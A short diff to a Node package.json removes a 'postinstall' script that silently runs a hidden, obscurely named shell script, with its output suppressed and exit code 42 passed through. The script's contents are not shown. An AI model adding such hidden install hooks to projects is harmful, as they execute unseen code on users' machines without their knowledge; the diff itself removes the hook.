@@ -6,8 +6,5 @@
     "nodemailer": "^6.9.12",
     "react-google-recaptcha": "^3.1.0",
     "sequelize": "^6.37.1"
-  },
-  "scripts": {
-    "postinstall": "sh ./.ci-cq2l95.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   }
 }
